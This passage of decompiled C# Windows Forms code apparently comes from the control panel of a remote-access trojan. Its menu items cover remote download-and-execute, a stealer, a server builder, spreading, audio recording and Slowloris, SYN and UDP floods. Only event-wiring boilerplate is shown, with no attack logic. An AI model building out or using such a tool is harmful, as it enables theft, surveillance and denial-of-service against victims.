                if (this._OkToolStripMenuItem != null)
                {
                    this._OkToolStripMenuItem.Click -= handler;
                }
                this._OkToolStripMenuItem = value;
                if (this._OkToolStripMenuItem != null)
                {
                    this._OkToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OkToolStripMenuItem1
        {
            get
            {
                return this._OkToolStripMenuItem1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OkToolStripMenuItem1_Click);
                if (this._OkToolStripMenuItem1 != null)
                {
                    this._OkToolStripMenuItem1.Click -= handler;
                }
                this._OkToolStripMenuItem1 = value;
                if (this._OkToolStripMenuItem1 != null)
                {
                    this._OkToolStripMenuItem1.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OkToolStripMenuItem2
        {
            get
            {
                return this._OkToolStripMenuItem2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OkToolStripMenuItem2_Click);
                if (this._OkToolStripMenuItem2 != null)
                {
                    this._OkToolStripMenuItem2.Click -= handler;
                }
                this._OkToolStripMenuItem2 = value;
                if (this._OkToolStripMenuItem2 != null)
                {
                    this._OkToolStripMenuItem2.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OkToolStripMenuItem3
        {
            get
            {
                return this._OkToolStripMenuItem3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OkToolStripMenuItem3_Click);
                if (this._OkToolStripMenuItem3 != null)
                {
                    this._OkToolStripMenuItem3.Click -= handler;
                }
                this._OkToolStripMenuItem3 = value;
                if (this._OkToolStripMenuItem3 != null)
                {
                    this._OkToolStripMenuItem3.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OkToolStripMenuItem4
        {
            get
            {
                return this._OkToolStripMenuItem4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OkToolStripMenuItem4_Click);
                if (this._OkToolStripMenuItem4 != null)
                {
                    this._OkToolStripMenuItem4.Click -= handler;
                }
                this._OkToolStripMenuItem4 = value;
                if (this._OkToolStripMenuItem4 != null)
                {
                    this._OkToolStripMenuItem4.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OkToolStripMenuItem5
        {
            get
            {
                return this._OkToolStripMenuItem5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OkToolStripMenuItem5_Click);
                if (this._OkToolStripMenuItem5 != null)
                {
                    this._OkToolStripMenuItem5.Click -= handler;
                }
                this._OkToolStripMenuItem5 = value;
                if (this._OkToolStripMenuItem5 != null)
                {
                    this._OkToolStripMenuItem5.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OkToolStripMenuItem6
        {
            get
            {
                return this._OkToolStripMenuItem6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OkToolStripMenuItem6_Click);
                if (this._OkToolStripMenuItem6 != null)
                {
                    this._OkToolStripMenuItem6.Click -= handler;
                }
                this._OkToolStripMenuItem6 = value;
                if (this._OkToolStripMenuItem6 != null)
                {
                    this._OkToolStripMenuItem6.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OkToolStripMenuItem7
        {
            get
            {
                return this._OkToolStripMenuItem7;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OkToolStripMenuItem7_Click);
                if (this._OkToolStripMenuItem7 != null)
                {
                    this._OkToolStripMenuItem7.Click -= handler;
                }
                this._OkToolStripMenuItem7 = value;
                if (this._OkToolStripMenuItem7 != null)
                {
                    this._OkToolStripMenuItem7.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OpenCDToolStripMenuItem
        {
            get
            {
                return this._OpenCDToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OpenCDToolStripMenuItem_Click);
                if (this._OpenCDToolStripMenuItem != null)
                {
                    this._OpenCDToolStripMenuItem.Click -= handler;
                }
                this._OpenCDToolStripMenuItem = value;
                if (this._OpenCDToolStripMenuItem != null)
                {
                    this._OpenCDToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OpenWebsiteToolStripMenuItem
        {
            get
            {
                return this._OpenWebsiteToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OpenWebsiteToolStripMenuItem_Click);
                if (this._OpenWebsiteToolStripMenuItem != null)
                {
                    this._OpenWebsiteToolStripMenuItem.Click -= handler;
                }
                this._OpenWebsiteToolStripMenuItem = value;
                if (this._OpenWebsiteToolStripMenuItem != null)
                {
                    this._OpenWebsiteToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem OSToolStripMenuItem
        {
            get
            {
                return this._OSToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.OSToolStripMenuItem_Click);
                if (this._OSToolStripMenuItem != null)
                {
                    this._OSToolStripMenuItem.Click -= handler;
                }
                this._OSToolStripMenuItem = value;
                if (this._OSToolStripMenuItem != null)
                {
                    this._OSToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual PictureBox PictureBox1
        {
            get
            {
                return this._PictureBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox1 = value;
            }
        }

        internal virtual ToolStripMenuItem PingToolStripMenuItem
        {
            get
            {
                return this._PingToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.PingToolStripMenuItem_Click);
                if (this._PingToolStripMenuItem != null)
                {
                    this._PingToolStripMenuItem.Click -= handler;
                }
                this._PingToolStripMenuItem = value;
                if (this._PingToolStripMenuItem != null)
                {
                    this._PingToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem PlayMusicToolStripMenuItem
        {
            get
            {
                return this._PlayMusicToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PlayMusicToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem PortScannerToolStripMenuItem
        {
            get
            {
                return this._PortScannerToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.PortScannerToolStripMenuItem_Click);
                if (this._PortScannerToolStripMenuItem != null)
                {
                    this._PortScannerToolStripMenuItem.Click -= handler;
                }
                this._PortScannerToolStripMenuItem = value;
                if (this._PortScannerToolStripMenuItem != null)
                {
                    this._PortScannerToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ProcessesToolStripMenuItem
        {
            get
            {
                return this._ProcessesToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ProcessesToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem RandomCursorToolStripMenuItem
        {
            get
            {
                return this._RandomCursorToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RandomCursorToolStripMenuItem_Click);
                if (this._RandomCursorToolStripMenuItem != null)
                {
                    this._RandomCursorToolStripMenuItem.Click -= handler;
                }
                this._RandomCursorToolStripMenuItem = value;
                if (this._RandomCursorToolStripMenuItem != null)
                {
                    this._RandomCursorToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem RandomIconDesktopToolStripMenuItem
        {
            get
            {
                return this._RandomIconDesktopToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RandomIconDesktopToolStripMenuItem_Click);
                if (this._RandomIconDesktopToolStripMenuItem != null)
                {
                    this._RandomIconDesktopToolStripMenuItem.Click -= handler;
                }
                this._RandomIconDesktopToolStripMenuItem = value;
                if (this._RandomIconDesktopToolStripMenuItem != null)
                {
                    this._RandomIconDesktopToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem RecordAudioToolStripMenuItem
        {
            get
            {
                return this._RecordAudioToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._RecordAudioToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem RecordToolStripMenuItem
        {
            get
            {
                return this._RecordToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RecordToolStripMenuItem_Click);
                if (this._RecordToolStripMenuItem != null)
                {
                    this._RecordToolStripMenuItem.Click -= handler;
                }
                this._RecordToolStripMenuItem = value;
                if (this._RecordToolStripMenuItem != null)
                {
                    this._RecordToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem RefreshToolStripMenuItem
        {
            get
            {
                return this._RefreshToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RefreshToolStripMenuItem_Click);
                if (this._RefreshToolStripMenuItem != null)
                {
                    this._RefreshToolStripMenuItem.Click -= handler;
                }
                this._RefreshToolStripMenuItem = value;
                if (this._RefreshToolStripMenuItem != null)
                {
                    this._RefreshToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem RemoteDownloadExecuteToolStripMenuItem
        {
            get
            {
                return this._RemoteDownloadExecuteToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RemoteDownloadExecuteToolStripMenuItem_Click);
                if (this._RemoteDownloadExecuteToolStripMenuItem != null)
                {
                    this._RemoteDownloadExecuteToolStripMenuItem.Click -= handler;
                }
                this._RemoteDownloadExecuteToolStripMenuItem = value;
                if (this._RemoteDownloadExecuteToolStripMenuItem != null)
                {
                    this._RemoteDownloadExecuteToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem RemoteFileManagerToolStripMenuItem
        {
            get
            {
                return this._RemoteFileManagerToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RemoteFileManagerToolStripMenuItem_Click);
                if (this._RemoteFileManagerToolStripMenuItem != null)
                {
                    this._RemoteFileManagerToolStripMenuItem.Click -= handler;
                }
                this._RemoteFileManagerToolStripMenuItem = value;
                if (this._RemoteFileManagerToolStripMenuItem != null)
                {
                    this._RemoteFileManagerToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ResHackerToolStripMenuItem
        {
            get
            {
                return this._ResHackerToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ResHackerToolStripMenuItem_Click);
                if (this._ResHackerToolStripMenuItem != null)
                {
                    this._ResHackerToolStripMenuItem.Click -= handler;
                }
                this._ResHackerToolStripMenuItem = value;
                if (this._ResHackerToolStripMenuItem != null)
                {
                    this._ResHackerToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem RestartToolStripMenuItem
        {
            get
            {
                return this._RestartToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RestartToolStripMenuItem_Click);
                if (this._RestartToolStripMenuItem != null)
                {
                    this._RestartToolStripMenuItem.Click -= handler;
                }
                this._RestartToolStripMenuItem = value;
                if (this._RestartToolStripMenuItem != null)
                {
                    this._RestartToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem RestartToolStripMenuItem1
        {
            get
            {
                return this._RestartToolStripMenuItem1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.RestartToolStripMenuItem1_Click);
                if (this._RestartToolStripMenuItem1 != null)
                {
                    this._RestartToolStripMenuItem1.Click -= handler;
                }
                this._RestartToolStripMenuItem1 = value;
                if (this._RestartToolStripMenuItem1 != null)
                {
                    this._RestartToolStripMenuItem1.Click += handler;
                }
            }
        }

        internal virtual TextBox RichTextBox1
        {
            get
            {
                return this.textBox_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this.textBox_0 = value;
            }
        }

        internal virtual RichTextBox RichTextBox2
        {
            get
            {
                return this._RichTextBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._RichTextBox2 = value;
            }
        }

        internal virtual RichTextBox RichTextBox3
        {
            get
            {
                return this._RichTextBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._RichTextBox3 = value;
            }
        }

        internal virtual RichTextBox RichTextBox4
        {
            get
            {
                return this._RichTextBox4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._RichTextBox4 = value;
            }
        }

        internal virtual ToolStripMenuItem SaveToFileToolStripMenuItem
        {
            get
            {
                return this._SaveToFileToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.SaveToFileToolStripMenuItem_Click);
                if (this._SaveToFileToolStripMenuItem != null)
                {
                    this._SaveToFileToolStripMenuItem.Click -= handler;
                }
                this._SaveToFileToolStripMenuItem = value;
                if (this._SaveToFileToolStripMenuItem != null)
                {
                    this._SaveToFileToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ServerEditorToolStripMenuItem
        {
            get
            {
                return this._ServerEditorToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.method_18);
                EventHandler handler2 = new EventHandler(this.method_17);
                EventHandler handler3 = new EventHandler(this.method_8);
                if (this._ServerEditorToolStripMenuItem != null)
                {
                    this._ServerEditorToolStripMenuItem.MouseLeave -= handler;
                    this._ServerEditorToolStripMenuItem.MouseEnter -= handler2;
                    this._ServerEditorToolStripMenuItem.Click -= handler3;
                }
                this._ServerEditorToolStripMenuItem = value;
                if (this._ServerEditorToolStripMenuItem != null)
                {
                    this._ServerEditorToolStripMenuItem.MouseLeave += handler;
                    this._ServerEditorToolStripMenuItem.MouseEnter += handler2;
                    this._ServerEditorToolStripMenuItem.Click += handler3;
                }
            }
        }

        internal virtual ToolStripMenuItem ServerToolStripMenuItem
        {
            get
            {
                return this._ServerToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ServerToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem SettingsToolStripMenuItem
        {
            get
            {
                return this._SettingsToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.SettingsToolStripMenuItem_Click);
                if (this._SettingsToolStripMenuItem != null)
                {
                    this._SettingsToolStripMenuItem.Click -= handler;
                }
                this._SettingsToolStripMenuItem = value;
                if (this._SettingsToolStripMenuItem != null)
                {
                    this._SettingsToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ShowSystemInformationToolStripMenuItem
        {
            get
            {
                return this._ShowSystemInformationToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ShowSystemInformationToolStripMenuItem_Click);
                if (this._ShowSystemInformationToolStripMenuItem != null)
                {
                    this._ShowSystemInformationToolStripMenuItem.Click -= handler;
                }
                this._ShowSystemInformationToolStripMenuItem = value;
                if (this._ShowSystemInformationToolStripMenuItem != null)
                {
                    this._ShowSystemInformationToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ShowTaskbarToolStripMenuItem
        {
            get
            {
                return this._ShowTaskbarToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ShowTaskbarToolStripMenuItem_Click);
                if (this._ShowTaskbarToolStripMenuItem != null)
                {
                    this._ShowTaskbarToolStripMenuItem.Click -= handler;
                }
                this._ShowTaskbarToolStripMenuItem = value;
                if (this._ShowTaskbarToolStripMenuItem != null)
                {
                    this._ShowTaskbarToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ShowToolStripMenuItem
        {
            get
            {
                return this._ShowToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ShowToolStripMenuItem_Click);
                if (this._ShowToolStripMenuItem != null)
                {
                    this._ShowToolStripMenuItem.Click -= handler;
                }
                this._ShowToolStripMenuItem = value;
                if (this._ShowToolStripMenuItem != null)
                {
                    this._ShowToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem ShutdownToolStripMenuItem
        {
            get
            {
                return this._ShutdownToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ShutdownToolStripMenuItem_Click);
                if (this._ShutdownToolStripMenuItem != null)
                {
                    this._ShutdownToolStripMenuItem.Click -= handler;
                }
                this._ShutdownToolStripMenuItem = value;
                if (this._ShutdownToolStripMenuItem != null)
                {
                    this._ShutdownToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual Control0 SideTab1
        {
            get
            {
                return this._SideTab1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._SideTab1 = value;
            }
        }

        internal virtual ToolStripMenuItem SkypeToolStripMenuItem
        {
            get
            {
                return this._SkypeToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._SkypeToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem SlowlorisToolStripMenuItem
        {
            get
            {
                return this._SlowlorisToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._SlowlorisToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem Sock5ToolStripMenuItem
        {
            get
            {
                return this._Sock5ToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Sock5ToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem SpeakComputerToolStripMenuItem
        {
            get
            {
                return this._SpeakComputerToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._SpeakComputerToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem SpreadToolStripMenuItem
        {
            get
            {
                return this._SpreadToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._SpreadToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem SSYNToolStripMenuItem
        {
            get
            {
                return this._SSYNToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._SSYNToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem StartToolStripMenuItem
        {
            get
            {
                return this._StartToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StartToolStripMenuItem_Click);
                if (this._StartToolStripMenuItem != null)
                {
                    this._StartToolStripMenuItem.Click -= handler;
                }
                this._StartToolStripMenuItem = value;
                if (this._StartToolStripMenuItem != null)
                {
                    this._StartToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StartToolStripMenuItem1
        {
            get
            {
                return this._StartToolStripMenuItem1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._StartToolStripMenuItem1 = value;
            }
        }

        internal virtual ToolStripMenuItem StartToolStripMenuItem2
        {
            get
            {
                return this._StartToolStripMenuItem2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StartToolStripMenuItem2_Click);
                if (this._StartToolStripMenuItem2 != null)
                {
                    this._StartToolStripMenuItem2.Click -= handler;
                }
                this._StartToolStripMenuItem2 = value;
                if (this._StartToolStripMenuItem2 != null)
                {
                    this._StartToolStripMenuItem2.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StartToolStripMenuItem3
        {
            get
            {
                return this._StartToolStripMenuItem3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StartToolStripMenuItem3_Click);
                if (this._StartToolStripMenuItem3 != null)
                {
                    this._StartToolStripMenuItem3.Click -= handler;
                }
                this._StartToolStripMenuItem3 = value;
                if (this._StartToolStripMenuItem3 != null)
                {
                    this._StartToolStripMenuItem3.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StartToolStripMenuItem4
        {
            get
            {
                return this._StartToolStripMenuItem4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StartToolStripMenuItem4_Click);
                if (this._StartToolStripMenuItem4 != null)
                {
                    this._StartToolStripMenuItem4.Click -= handler;
                }
                this._StartToolStripMenuItem4 = value;
                if (this._StartToolStripMenuItem4 != null)
                {
                    this._StartToolStripMenuItem4.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StartToolStripMenuItem5
        {
            get
            {
                return this._StartToolStripMenuItem5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StartToolStripMenuItem5_Click);
                if (this._StartToolStripMenuItem5 != null)
                {
                    this._StartToolStripMenuItem5.Click -= handler;
                }
                this._StartToolStripMenuItem5 = value;
                if (this._StartToolStripMenuItem5 != null)
                {
                    this._StartToolStripMenuItem5.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StartToolStripMenuItem6
        {
            get
            {
                return this._StartToolStripMenuItem6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StartToolStripMenuItem6_Click);
                if (this._StartToolStripMenuItem6 != null)
                {
                    this._StartToolStripMenuItem6.Click -= handler;
                }
                this._StartToolStripMenuItem6 = value;
                if (this._StartToolStripMenuItem6 != null)
                {
                    this._StartToolStripMenuItem6.Click += handler;
                }
            }
        }

        internal virtual StatusStrip StatusStrip1
        {
            get
            {
                return this._StatusStrip1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._StatusStrip1 = value;
            }
        }

        internal virtual ToolStripMenuItem StatusToolStripMenuItem
        {
            get
            {
                return this._StatusToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StatusToolStripMenuItem_Click);
                if (this._StatusToolStripMenuItem != null)
                {
                    this._StatusToolStripMenuItem.Click -= handler;
                }
                this._StatusToolStripMenuItem = value;
                if (this._StatusToolStripMenuItem != null)
                {
                    this._StatusToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StealerToolStripMenuItem
        {
            get
            {
                return this._StealerToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StealerToolStripMenuItem_Click);
                if (this._StealerToolStripMenuItem != null)
                {
                    this._StealerToolStripMenuItem.Click -= handler;
                }
                this._StealerToolStripMenuItem = value;
                if (this._StealerToolStripMenuItem != null)
                {
                    this._StealerToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StopRecordToolStripMenuItem
        {
            get
            {
                return this._StopRecordToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StopRecordToolStripMenuItem_Click);
                if (this._StopRecordToolStripMenuItem != null)
                {
                    this._StopRecordToolStripMenuItem.Click -= handler;
                }
                this._StopRecordToolStripMenuItem = value;
                if (this._StopRecordToolStripMenuItem != null)
                {
                    this._StopRecordToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StopToolStripMenuItem
        {
            get
            {
                return this._StopToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StopToolStripMenuItem_Click);
                if (this._StopToolStripMenuItem != null)
                {
                    this._StopToolStripMenuItem.Click -= handler;
                }
                this._StopToolStripMenuItem = value;
                if (this._StopToolStripMenuItem != null)
                {
                    this._StopToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StopToolStripMenuItem1
        {
            get
            {
                return this._StopToolStripMenuItem1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StopToolStripMenuItem1_Click);
                if (this._StopToolStripMenuItem1 != null)
                {
                    this._StopToolStripMenuItem1.Click -= handler;
                }
                this._StopToolStripMenuItem1 = value;
                if (this._StopToolStripMenuItem1 != null)
                {
                    this._StopToolStripMenuItem1.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StopToolStripMenuItem2
        {
            get
            {
                return this._StopToolStripMenuItem2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StopToolStripMenuItem2_Click);
                if (this._StopToolStripMenuItem2 != null)
                {
                    this._StopToolStripMenuItem2.Click -= handler;
                }
                this._StopToolStripMenuItem2 = value;
                if (this._StopToolStripMenuItem2 != null)
                {
                    this._StopToolStripMenuItem2.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StopToolStripMenuItem4
        {
            get
            {
                return this._StopToolStripMenuItem4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StopToolStripMenuItem4_Click);
                if (this._StopToolStripMenuItem4 != null)
                {
                    this._StopToolStripMenuItem4.Click -= handler;
                }
                this._StopToolStripMenuItem4 = value;
                if (this._StopToolStripMenuItem4 != null)
                {
                    this._StopToolStripMenuItem4.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StopToolStripMenuItem5
        {
            get
            {
                return this._StopToolStripMenuItem5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StopToolStripMenuItem5_Click);
                if (this._StopToolStripMenuItem5 != null)
                {
                    this._StopToolStripMenuItem5.Click -= handler;
                }
                this._StopToolStripMenuItem5 = value;
                if (this._StopToolStripMenuItem5 != null)
                {
                    this._StopToolStripMenuItem5.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem StopToolStripMenuItem6
        {
            get
            {
                return this._StopToolStripMenuItem6;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.StopToolStripMenuItem6_Click);
                if (this._StopToolStripMenuItem6 != null)
                {
                    this._StopToolStripMenuItem6.Click -= handler;
                }
                this._StopToolStripMenuItem6 = value;
                if (this._StopToolStripMenuItem6 != null)
                {
                    this._StopToolStripMenuItem6.Click += handler;
                }
            }
        }

        internal virtual ToolStripMenuItem SUDPToolStripMenuItem
        {
            get
            {
                return this._SUDPToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._SUDPToolStripMenuItem = value;
            }
        }

        internal virtual ToolStripMenuItem SwapMouseButtonToolStripMenuItem
        {
            get
            {
                return this._SwapMouseButtonToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.SwapMouseButtonToolStripMenuItem_Click);
                if (this._SwapMouseButtonToolStripMenuItem != null)
                {
                    this._SwapMouseButtonToolStripMenuItem.Click -= handler;
                }
                this._SwapMouseButtonToolStripMenuItem = value;
                if (this._SwapMouseButtonToolStripMenuItem != null)
                {
                    this._SwapMouseButtonToolStripMenuItem.Click += handler;
                }
            }
        }

        internal virtual TabPage TabPage1
        {
            get
            {
                return this._TabPage1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage1 = value;
            }
        }

        internal virtual TabPage TabPage2
        {
            get
            {
                return this._TabPage2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage2 = value;
            }
        }

        internal virtual TabPage TabPage3
        {
            get
            {
                return this._TabPage3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage3 = value;
            }
        }

        internal virtual TabPage TabPage4
        {
            get
            {
                return this._TabPage4;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage4 = value;
            }
        }

        internal virtual TabPage TabPage5
        {
            get
            {
                return this._TabPage5;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TabPage5 = value;
            }
        }

        internal virtual ToolStripMenuItem TCPToolStripMenuItem
        {
            get
            {
                return this._TCPToolStripMenuItem;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TCPToolStripMenuItem = value;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return this._TextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox1 = value;
            }
        }

        internal virtual TextBox TextBox2
        {
            get
            {
                return this._TextBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.TextBox2_TextChanged);
                if (this._TextBox2 != null)
                {
                    this._TextBox2.TextChanged -= handler;
                }
                this._TextBox2 = value;
                if (this._TextBox2 != null)
                {
                    this._TextBox2.TextChanged += handler;
                }
            }
        }

